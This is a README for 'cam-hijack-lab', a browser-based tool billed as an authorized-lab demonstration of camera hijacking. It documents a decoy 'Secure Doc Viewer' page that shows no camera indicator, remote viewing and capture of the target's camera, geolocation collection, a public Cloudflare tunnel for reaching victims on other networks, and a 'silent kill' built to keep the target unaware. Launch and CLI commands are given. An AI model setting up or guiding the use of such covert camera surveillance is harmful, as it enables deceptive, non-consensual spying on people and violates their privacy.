# cam-hijack-lab —  Browser Base Camera Hijacking

[![Python](https://img.shields.io/badge/python-3.8+-blue?logo=python)](https://python.org)
[![Security](https://img.shields.io/badge/use-authorized_only-orange)](#disclaimer)

> **Browser-based camera access demonstration for authorized labs.** Victim opens a "Secure Doc Viewer" link; the monitor can flip the target camera and capture a frame as evidence. In-memory only — sessions die on kill/restart; only manually captured frames touch disk.

---

## Disclaimer

Built for **security research, awareness training, and authorized lab testing**. Unauthorized use is illegal. By using this tool you agree to:

- Only test devices you own or have explicit written permission to test
- Keep targets inside a closed lab; never point this at bystanders or the public
- Comply with local and international law; take full responsibility for use

Audio is disabled. Frames are written to disk **only** via `./camlab cap <sid>`.

---

## Features

- In-memory session state (no persistence across server restart)
- Victim page disguised as "Secure Doc Viewer" — no visible camera indicator
- Monitor controls: flip target camera, capture evidence frame
- One victim link, multiple devices/tabs — each registers its own DID
- Per-device selection (`AUTO` or pinned DID) for feed/flip/capture
- Silent kill: stops device, clears camera/geo, ignores late frames
- Optional Cloudflare quick tunnel (no account) for cross-network labs
- Python stdlib only; self-signed cert generated on first run

---

## Requirements

- Python 3 (stdlib only — no pip install)
- OpenSSL (self-signed certificate generated automatically on first run)
- `cloudflared` — only if a public tunnel is needed

---

## Quick Start

```bash
./run.sh          # HTTPS on port 3040 (override: PORT=30xx ./run.sh)
./camlab new      # prints 3 links: victim, monitor, monitor-auto
```

1. **Victim**: open the victim link on the lab target device (accept the HTTPS warning). It shows "Secure Doc Viewer" with no camera preview. Click "Open the document", allow the photo/picture permission prompt.
2. **Monitor**: open the monitor link in your browser. Use "Flip target camera" and "Capture frame (evidence)".

---

## CLI Reference

```
./camlab new                     new session, print victim + monitor links
./camlab gen victim <sid>        reprint victim link
./camlab gen monitor <sid>       reprint monitor link
./camlab list                    active sessions (ip, last seen, cam, geo)
./camlab dev <sid>               devices on a link (did, ip, cam)
./camlab sel <sid> <did|auto>    pin feed/flip/capture to a device
./camlab kill <sid>              stop session: halt devices + clear data
./camlab cap <sid>               save evidence frame to captures/
./camlab tunnel                  cloudflare quick tunnel -> public link
./camlab tunoff                  stop tunnel
```

---

## Ports & Environment

```
3040   (PORT)                  HTTPS, browser side
3041   (PORT+1)                loopback plain HTTP origin for tunnel feeder
```

- Check first: `ss -ltn | grep 30`. If busy, `run.sh` warns.
- Optional env: `PORT`, `CAMLAB_ORIGIN_PORT`, `CAMLAB_HOST`, `CAMLAB_PORT`.
- Long-lived background (no TTY):
  ```
  setsid nohup ./run.sh > /tmp/camlab.log 2>&1 < /dev/null &
  ```
  (`nohup` without `setsid` can be reaped with the launching session.)

---

## One Link, Multiple Devices

- Each device/tab opening the victim link registers its own DID.
- Default `AUTO`: monitor shows the most recent frame from any device (last writer); flip lands on whichever device polls first.
- Switch watched/controlled target:
  - Monitor (`/m/<sid>`): device dropdown under the flip button. Pick `AUTO` or a DID.
  - CLI: `./camlab dev <sid>` (list), `./camlab sel <sid> <did>` or `auto`.
- While pinned: feed, capture and flip apply only to the selected device.
- Two tabs on the same device = two DIDs.

---

## Kill a Session

```bash
./camlab kill <sid>
```

- Victim tab: stops silently — camera off, geo cleared, frame upload halted, original view restored. Target is not notified.
- Server: frames/geo/pin cleared. Late frames ignored (server replies normally so the tab stays unsuspicious).
- Monitor: state `DEAD`, flip/capture disabled.
- Kill applies while the session is alive (tab still polling). After tab close + 10 min idle, the sid becomes fresh. Restart clears everything.

---

## Tunnel (Cloudflare, no account)

```bash
./camlab tunnel     # prints https://<random>.trycloudflare.com + session links
./camlab tunoff
```

- Public link works from any network (victim on different WiFi/cellular still works).
- Cloudflare's cert: no self-signed warning for the victim.
- Ephemeral URL: changes per tunnel run, saved to `.tunnel-url`. While active, `camlab new` uses the public link automatically.
- Background tunnel without TTY:
  ```
  setsid nohup cloudflared tunnel --url http://127.0.0.1:3041 --no-autoupdate --logfile tunnel.log >/dev/null 2>&1 < /dev/null &
  ```
  then read the URL from `tunnel.log` and write it to `.tunnel-url`.

---

## Stop Server

```bash
pkill -f '^python3 server[.]py$'
```

- The process runs as `python3 server.py` (exec'd by `run.sh`), so a `cam-hijack-lab/...` pattern won't match.
- Never use bare `pkill -f 'server.py'` — it also matches unrelated processes such as `hexstrike_server.py`. Get the PID from `pgrep`/`ss` instead.

---

## Move to Another Machine

```bash
tar xzf cam-hijack-lab-bundle.tgz
chmod +x cam-hijack-lab/camlab cam-hijack-lab/run.sh
cd cam-hijack-lab && ./run.sh
```

- Clean bundle: no `.cert`, `captures/`, `tunnel.log`, `.tunnel-url`.
- `cloudflared` single binary: https://github.com/cloudflare/cloudflared/releases (`cloudflared-linux-amd64`), place in `~/.local/bin`.

---

## Project Structure

```
cam-hijack-lab/
├── server.py       HTTPS server + in-memory session state
├── camlab          management CLI
├── run.sh          launcher (cert generation + port check)
├── index.html      victim "Secure Doc Viewer" page
├── monitor.html    monitor control page
├── README.md       this file
└── .cert/          generated TLS cert (gitignored)
    captures/       manually captured frames (gitignored)
```

---

## License

Internal / authorized lab use only. See disclaimer above.
